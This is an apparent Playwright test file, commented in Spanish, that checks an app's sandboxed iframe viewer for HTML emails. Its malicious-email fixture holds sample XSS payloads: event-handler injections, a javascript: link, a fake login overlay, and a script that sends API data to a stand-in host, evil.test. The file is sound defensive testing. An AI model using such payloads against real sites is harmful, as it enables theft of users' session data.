// 035 — Vista segura de correos HTML (US1). Verifica en un navegador real que
// un correo malicioso no ejecuta nada, no sale del recuadro, no pide recursos
// externos y no puede tocar la sesión ni las APIs de Karia.
//
// Requiere: app levantada, CORREO_VISTA_SECRETO definido y `npm run db:seed:test`.
import { test, expect, request as crearContextoHttp } from '@playwright/test';
import { authFile } from '../../fixtures';
import {
  crearConversacionCorreoHtml,
  eliminarConversacionCorreoHtml,
  obtenerInstanciaPruebas,
  obtenerUsuarioOwner,
  type ConversacionCorreoHtml,
} from '../../helpers/db';

test.use({ storageState: authFile.owner });

const HTML_MALICIOSO = `
  <h1 style="color:#0a58ca">Aviso de prueba</h1>
  <p id="texto-seguro">Contenido legítimo del correo.</p>
  <img src=x onerror="parent.document.body.innerHTML='PWNED'">
  <script>fetch('/api/conversaciones').then(r=>r.text()).then(t=>top.location='https://evil.test/?'+t)</script>
  <a href="javascript:alert(1)">js</a> <a id="enlace-ok" href="https://example.com">ok</a>
  <form action="https://evil.test"><input name=p><button>Enviar</button></form>
  <div style="position:fixed;inset:0;background:red">Inicie sesión de nuevo</div>
  <svg onload="alert(1)"></svg><iframe src="/crm"></iframe>
  <meta http-equiv="refresh" content="0;url=https://evil.test">
  <img src="https://tracker.test/pixel.gif" width=1 height=1>
`;

let datos: ConversacionCorreoHtml;

test.beforeAll(async () => {
  const instancia = await obtenerInstanciaPruebas();
  const owner = await obtenerUsuarioOwner(instancia.id);
  datos = await crearConversacionCorreoHtml({ instanciaId: instancia.id, usuarioId: owner.id, html: HTML_MALICIOSO });
});

test.afterAll(async () => {
  if (datos) await eliminarConversacionCorreoHtml(datos);
});

test.describe('Correo HTML aislado', () => {
  test('CH-01 la vista es un iframe con sandbox exacto y el correo malicioso no tiene efecto', async ({ page }) => {
    const dialogos: string[] = [];
    page.on('dialog', async (d) => {
      dialogos.push(d.message());
      await d.dismiss();
    });
    const externas: string[] = [];
    page.on('request', (r) => {
      const url = r.url();
      if (/evil\.test|tracker\.test/.test(url)) externas.push(url);
      // Ninguna petición a la API de Karia puede salir desde el iframe del correo.
      if (r.frame() !== page.mainFrame() && /\/api\/(?!correo-aislado)/.test(url)) externas.push(url);
    });

    await page.goto('/crm/inbox');
    const buscador = page.getByPlaceholder(/buscar|search/i).first();
    await buscador.fill(datos.asunto.split(' ').at(-1)!.slice(-5));
    await page.getByText(/Correo HTML-/).first().click();

    const iframe = page.locator('iframe[title="Contenido del correo"]').first();
    await expect(iframe).toBeVisible({ timeout: 15_000 });
    await expect(iframe).toHaveAttribute('sandbox', 'allow-popups allow-popups-to-escape-sandbox');
    await expect(iframe).toHaveAttribute('referrerpolicy', 'no-referrer');

    const marco = page.frameLocator('iframe[title="Contenido del correo"]').first();
    await expect(marco.locator('h1')).toHaveText('Aviso de prueba');
    await expect(marco.locator('script, form, input, button, svg, iframe, meta[http-equiv]')).toHaveCount(0);
    await expect(marco.locator('[onerror], [onload], [onclick]')).toHaveCount(0);
    await expect(marco.locator('a[href^="javascript"]')).toHaveCount(0);
    await expect(marco.locator('a[href="https://example.com"]')).toHaveAttribute('rel', 'noopener noreferrer nofollow');

    await page.waitForTimeout(1500);
    expect(dialogos).toEqual([]);
    expect(externas).toEqual([]);
    await expect(page).toHaveURL(/\/crm\/inbox/);
    await expect(page.locator('body')).not.toHaveText(/^PWNED$/);
  });

  test('CH-02 el documento del correo tiene origen opaco: sin cookies ni almacenamiento', async ({ page }) => {
    const res = await page.request.get(`/api/correo/mensajes/${datos.mensajeId}`);
    expect(res.status()).toBe(200);
    const { html } = await res.json();
    expect(html.estado).toBe('DISPONIBLE');

    // Se carga la vista dentro de un iframe con el mismo sandbox, como en el Inbox.
    await page.goto('/crm/inbox');
    await page.evaluate((src) => {
      const f = document.createElement('iframe');
      f.id = 'vista-prueba';
      f.setAttribute('sandbox', 'allow-popups allow-popups-to-escape-sandbox');
      f.src = src;
      document.body.appendChild(f);
    }, html.urlVista);
    await expect.poll(() => page.frame({ url: /correo-aislado\/vista/ }) !== null).toBe(true);
    // Origen opaco: la página de Karia no puede entrar al documento del correo
    // (contentDocument null), y por simetría el correo tampoco puede tocar
    // la página, sus cookies ni su almacenamiento.
    const accesible = await page.evaluate(() => {
      const f = document.getElementById('vista-prueba') as HTMLIFrameElement;
      try {
        return f.contentDocument !== null;
      } catch {
        return false;
      }
    });
    expect(accesible).toBe(false);
  });

  test('CH-03 cabeceras de seguridad de la vista', async ({ page }) => {
    const { html } = await (await page.request.get(`/api/correo/mensajes/${datos.mensajeId}`)).json();
    const vista = await page.request.get(html.urlVista);
    expect(vista.status()).toBe(200);
    const h = vista.headers();
    expect(h['content-security-policy']).toContain("script-src 'none'");
    expect(h['content-security-policy']).toContain("connect-src 'none'");
    expect(h['content-security-policy']).toContain("form-action 'none'");
    expect(h['content-security-policy']).toContain('sandbox allow-popups allow-popups-to-escape-sandbox');
    expect(h['content-security-policy']).not.toMatch(/allow-scripts|allow-same-origin/);
    expect(h['x-content-type-options']).toBe('nosniff');
    expect(h['referrer-policy']).toBe('no-referrer');
    expect(h['cache-control']).toBe('private, no-store');
    const cuerpo = await vista.text();
    expect(cuerpo).not.toMatch(/<script|onerror|javascript:|tracker\.test|evil\.test/i);
  });

  test('CH-04 token alterado o sin sesión → 404', async ({ page, baseURL }) => {
    const { html } = await (await page.request.get(`/api/correo/mensajes/${datos.mensajeId}`)).json();
    const alterada = html.urlVista.replace(/.{3}$/, 'zzz');
    expect((await page.request.get(alterada)).status()).toBe(404);

    // Contexto HTTP sin cookies: la ruta con sesión no revela nada.
    const anonimo = await crearContextoHttp.newContext({ baseURL, storageState: { cookies: [], origins: [] } });
    const res = await anonimo.get(`/api/correo/mensajes/${datos.mensajeId}`, { maxRedirects: 0 });
    expect([302, 303, 307, 404]).toContain(res.status());
    if (res.status() !== 404) expect(res.headers()['location'] ?? '').toContain('/login');
    await anonimo.dispose();
  });
});
